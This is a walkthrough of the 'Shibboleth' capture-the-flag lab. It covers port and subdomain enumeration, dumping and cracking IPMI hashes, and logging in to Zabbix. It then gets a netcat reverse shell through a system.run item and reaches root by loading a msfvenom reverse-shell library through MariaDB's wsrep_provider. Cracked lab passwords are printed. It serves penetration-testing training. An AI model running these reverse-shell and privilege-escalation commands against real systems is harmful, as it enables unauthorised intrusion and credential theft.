# Shibboleth WalkThrough
																																								
##	Let's First Scan Machine IP Using Nmap 

```
sudo nmap -A -O -v -p- --script vuln 10.10.11.124
```

### Result

```
PORT   STATE SERVICE VERSION 
80/tcp open  http    Apache httpd 2.4.41 
|_http-server-header: Apache/2.4.41 (Ubuntu) 
```																																				

## Here We Find Port 80 is Open i.e, http
## Now Let's First Add Machine IP To /etc/hosts file. 

```
10.10.11.124    shibboleth.htb
``` 

## Now go to your web browser enter machine ip in navigation bar, It take you to that http server running on port 80. 


## Let's first scan website using gobuster for fihnding hidden and other directories

```
gobuster dir -u http://shibboleth.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Result

```
=============================================================== 
2022/03/18 09:08:01 Starting gobuster in directory enumeration mode 
=============================================================== 
/assets               (Status: 301) [Size: 317] [--> http://shibboleth.htb/assets/] 
/forms                (Status: 301) [Size: 316] [--> http://shibboleth.htb/forms/] 
```

## We Found Two directory both are not useful. Now Let's start search for subdomain using wfuzz scanner.

```
wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://shibboleth.htb/  -c -H "Host:FUZZ.shibboleth.htb" --hw 26
```

### Result

```
===================================================================== 
ID           Response   Lines    Word       Chars       Payload                                                       
===================================================================== 
 
000000099:   200        29 L     219 W      3684 Ch     "monitor"                                                     
000000346:   200        29 L     219 W      3684 Ch     "monitoring"                                                  
000000390:   200        29 L     219 W      3684 Ch     "zabbix"
```

## Here we got  three Subdomain let's add these all subdomain to our /etc/hosts file.

```
10.10.11.124    shibboleth.htb monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb
```

## Now let's try to access these subdomain using our web-browser. In all subdomain we found login form . Nothing else.

## Let's scan udp ports also using nmap

```
sudo nmap -sU -sC -sV shibboleth.htb -T4
```

### Result

```
PORT      STATE         SERVICE       VERSION 
623/udp   open          asf-rmcp 
5001/udp  open|filtered commplex-link 
6347/udp  open|filtered gnutella2 
18228/udp open|filtered unknown 
19792/udp open|filtered unknown 
20120/udp open|filtered unknown 
49192/udp open|filtered unknown
```

## Here we got 623 port as open and other are filtered. 623 Port service is asf-rmpc , let's google for this port exploitation. 

```
https://book.hacktricks.xyz/pentesting/623-udp-ipmi
```

## we got this page in google search for exploiting 623 port. Now according to this blog for finding ipmi_version we need to use this  auxiliary.

### Auxiliary given below

```
auxiliary/scanner/ipmi/ipmi_version
```

## Now let's load metasploit for using this auxiliary.

### Result

```
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
 
Module options (auxiliary/scanner/ipmi/ipmi_version): 
 
   Name       Current Setting  Required  Description 
   ----       ---------------  --------  ----------- 
   BATCHSIZE  256              yes       The number of hosts to probe in each set 
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-M 
                                         etasploit 
   RPORT      623              yes       The target port (UDP) 
   THREADS    10               yes       The number of concurrent threads 
 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set RHOSTS 10.10.11.124 
RHOSTS => 10.10.11.124 
msf6 auxiliary(scanner/ipmi/ipmi_version) > exploit 
 
[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts) 
[+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1
.5, 2.0)  
[*] Scanned 1 of 1 hosts (100% complete) 
[*] Auxiliary module execution completed
```

## After using this auxiliary we got impi version i.e, IPMI-2.0

## Now on blog we found IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval section . Use this auxiliry to retrive hash.

### Auxiliary given below

```
auxiliary/scanner/ipmi/ipmi_dumphashes
```

### Result

```
msf6 auxiliary(scanner/ipmi/ipmi_version) > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
 
Module options (auxiliary/scanner/ipmi/ipmi_dumphashes): 
 
   Name                  Current Setting                  Required  Description 
   ----                  ---------------                  --------  ----------- 
   CRACK_COMMON          true                             yes       Automatically crack common passwords as they are obtaine 
                                                                    d 
   OUTPUT_HASHCAT_FILE                                    no        Save captured password hashes in hashcat format 
   OUTPUT_JOHN_FILE                                       no        Save captured password hashes in john the ripper format 
   PASS_FILE             /usr/share/metasploit-framework  yes       File containing common passwords for offline cracking, o 
                         /data/wordlists/ipmi_passwords.            ne per line 
                         txt 
   RHOSTS                                                 yes       The target host(s), see https://github.com/rapid7/metasp 
                                                                    loit-framework/wiki/Using-Metasploit 
   RPORT                 623                              yes       The target port 
   SESSION_MAX_ATTEMPTS  5                                yes       Maximum number of session retries, required on certain B 
                                                                    MCs (HP iLO 4, etc) 
   SESSION_RETRY_DELAY   5                                yes       Delay between session retries in seconds 
   THREADS               1                                yes       The number of concurrent threads (max one per host) 
   USER_FILE             /usr/share/metasploit-framework  yes       File containing usernames, one per line 
                         /data/wordlists/ipmi_users.txt 
 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.10.11.124 
RHOSTS => 10.10.11.124 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > exploit
 
DO YOURSELF
```

## Now we got hash of Administrator let's try to crack this hash . For cracking the hash we first need to identify the hash type.
### Hash-Identifier doesn't find hash type let's do a manual search for ipmi hash. Go to https://hashcat.net/wiki/doku.php?id=example_hashes and search for ipmi2 we found 7300 mode. Let's use hashcat for cracking this hash.

```
hashcat -m 7300 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt
```
## After few seconds it cracked the hash and that cracked hash result stored in cracked.txt. Now use this credential to login on subdomain login form.

```
ilovepumkinpie1
```

# BOOOOOM!!!!! WE SUCESSFULLY LOGIN TO ADMINISTRATOR ACCOUNT.

## Now, we need to get a shell for this go to configuration → Host → Item → Create Item
## Now fill first 3 field on key click on select and select server.run and on command session use netcat reverse shell you get this reverse shell on pentest monkey website.  and on mode you can use wait or nowait we use nowait because wait shell is unstable.

```
system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f,nowait]
```

## Now start a netcat listener and click on test 
### BOOOMMM!!!! YOU GOT SHELL.
## Now let's get a tty shell using python3.

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

## we need to esclate to ipmi-svc user this is easy to do just use cracked hash value for password and you get shell of ipmi-svc user.

## Now let's enumerate further.

```
find / -type f -group ipmi-svc ! -path "/proc/*" ! -path "/syc/*" -exec ls -al {} \; 2>/dev/null
```
###Result

```
-rw-r--r-- 1 ipmi-svc ipmi-svc 0 Apr 24  2021 /home/ipmi-svc/.cache/motd.legal-displayed 
-rw-rw-r-- 1 ipmi-svc ipmi-svc 22 Apr 24  2021 /home/ipmi-svc/.vimrc 
-rw-r--r-- 1 ipmi-svc ipmi-svc 220 Apr 24  2021 /home/ipmi-svc/.bash_logout 
-rw-r--r-- 1 ipmi-svc ipmi-svc 807 Apr 24  2021 /home/ipmi-svc/.profile 
-rw-r--r-- 1 ipmi-svc ipmi-svc 3771 Apr 24  2021 /home/ipmi-svc/.bashrc 
-rw-r----- 1 ipmi-svc ipmi-svc 33 Mar 18 05:21 /home/ipmi-svc/user.txt 
-rw-r----- 1 root ipmi-svc 22306 Oct 18 09:24 /etc/zabbix/zabbix_server.conf.dpkg-dist 
-rw-r----- 1 root ipmi-svc 21863 Apr 24  2021 /etc/zabbix/zabbix_server.conf
```

## By using the above command we get interesting files. Now using netstat we find .conf may be contain credentials

```
netstat -antlp
```

### Result

```
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      - 
```

## Now let's cat file with grep

```
cat zabbix_server.conf | grep DB
```

### Result

```
### Option: DBHost 
# DBHost=localhost 
### Option: DBName 
# DBName= 
DBName=zabbix 
### Option: DBSchema 
# DBSchema= 
### Option: DBUser 
# DBUser= 
DBUser=zabbix 
### Option: DBPassword 
DBPassword=bloooarskybluh 
### Option: DBSocket 
# DBSocket= 
### Option: DBPort 
# DBPort= 
### Option: StartDBSyncers 
#       Number of pre-forked instances of DB Syncers. 
# StartDBSyncers=4 
### Option: DBTLSConnect 
#       verify_full - connect using TLS, verify certificate and verify that database identity specified by DBHost 
#       On MariaDB starting from version 10.2.6 "required" and "verify_full" values are supported. 
# DBTLSConnect= 
### Option: DBTLSCAFile 
#       (yes, if DBTLSConnect set to one of: verify_ca, verify_full) 
# DBTLSCAFile= 
### Option: DBTLSCertFile 
# DBTLSCertFile= 
### Option: DBTLSKeyFile 
# DBTLSKeyFile= 
### Option: DBTLSCipher 
# DBTLSCipher= 
### Option: DBTLSCipher13 
# DBTLSCipher13=
```

## Here we got mysql database user and password .

## Now create a payload using msfvenom 

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=2345 -f elf-so -o root.so
```
## Now upload this /payload to target temp directory for doing this start a python server.

```
python3 -m http.server
```

## And go to the target /temp directory and download this using wget.

```
wget <file url>
```

## Now start a netcat listner and login to Mysql database using credentials we found and set the wsrep_provider to your payload

```
ipmi-svc@shibboleth:/tmp$ mysql -h 127.0.0.1 -u zabbix -p 
mysql -h 127.0.0.1 -u zabbix -p 
Enter password: bloooarskybluh 
 
Welcome to the MariaDB monitor.  Commands end with ; or \g. 
Your MariaDB connection id is 3466 
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 
 
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. 
 
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. 
 
MariaDB [(none)]> SET GLOBAL wsrep_provider="/tmp/shell.so"; 
SET GLOBAL wsrep_provider="/tmp/shell.so"; 
ERROR 2013 (HY000): Lost connection to MySQL server during query 
MariaDB [(none)]> 
```

# BOOOMM!!!!!! WE GOT ROOT SHELL 
![hacker](https://www.itgovernance.co.uk/blog/wp-content/uploads/2014/07/nedry.jpg)
  
